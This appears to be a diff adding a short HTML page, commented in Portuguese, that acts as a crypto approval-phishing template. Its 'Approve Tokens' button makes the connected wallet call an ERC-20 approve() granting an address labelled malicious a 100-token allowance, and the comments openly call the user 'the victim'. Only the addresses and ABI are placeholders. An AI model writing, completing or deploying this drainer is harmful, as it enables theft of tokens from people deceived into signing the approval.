@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Aprovar Tokens</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+</head>
+<body>
+    <button id="approveBtn">Aprovar Tokens</button>
+
+    <script>
+        const web3 = new Web3(Web3.givenProvider); // Conecta com a carteira do usuário
+        const tokenAddress = 'ENDERECO_DO_CONTRATO_ERC20_AQUI'; // Endereço do contrato ERC-20
+        const contractABI = [...] // ABI do contrato ERC-20
+        const contract = new web3.eth.Contract(contractABI, tokenAddress);
+
+        const maliciousAddress = 'ENDERECO_DO_CONTRATO_MALICIOSO_AQUI'; // Endereço do contrato malicioso
+        const amountToApprove = web3.utils.toWei('100', 'ether'); // Quantidade de tokens que a vítima está aprovando
+
+        document.getElementById('approveBtn').addEventListener('click', function() {
+            web3.eth.getAccounts().then(function(accounts) {
+                const userAccount = accounts[0]; // Assume-se que a conta conectada é a da vítima
+                contract.methods.approve(maliciousAddress, amountToApprove).send({from: userAccount})
+                .then(function(tx) {
+                    console.log('Tokens aprovados', tx);
+                }).catch(function(error) {
+                    console.error('Erro ao aprovar tokens', error);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
